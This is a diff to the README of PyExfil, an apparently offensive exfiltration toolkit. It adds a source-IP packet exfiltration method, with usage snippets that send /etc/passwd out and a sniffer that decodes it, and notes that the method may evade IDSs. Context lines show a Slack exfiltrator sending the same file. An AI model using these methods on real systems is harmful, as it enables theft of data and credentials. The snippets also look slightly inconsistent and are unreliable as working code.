@@ -15,6 +15,7 @@ This started as a PoC project but has later turned into something a bit more. Cu
   * POP3 Authentication (as password) - Idea thanks to [Itzik Kotler](https://github.com/ikotler)
   * FTP MKDIR technique - Idea thanks to [Itzik Kotler](https://github.com/ikotler)
   * DB-LSP (Broadcast or Unicast).
+  * Source IP-based Exfiltration
 * Physical
   * Audio
   * QR Codes
@@ -207,6 +208,25 @@ slackExf = SlackExfiltrator(slackID="11111FD", slackToken="xoxo-abc", encKey="Ab
 slackExf._connect2Slack()
 slackExf.ExfiltrateFile(file_path="/etc/passwd")
 ```
+
+### Source IP Based Exfiltration
+
+Will take a file and attempt to exfiltrate it on the source IP field in a TCP/IP packet. This method is slow, and depending on the configuration of the IDSs might trigger more alerts or none at all. We figured out it worked in a lot of our cases although it was relatively slow. It is written poorly and will not even support exfiltration of two files at the same time and will not make up for integrity issues. We welcome contributors here.
+
+#### Exfiltration
+```python
+from pyexfil.network.SpoofIP import spoofIPs_client
+
+_send(file_path="/etc/passwd", to="127.0.0.1")
+```
+
+#### Decoding (must run simultaneously)
+```python
+from pyexfil.network.SpoofIP import spoofIPs_server
+
+sniff(iface="en0", prn=pkt_callback, filter="tcp", store=0)
+```
+
 
 
 ### QUIC
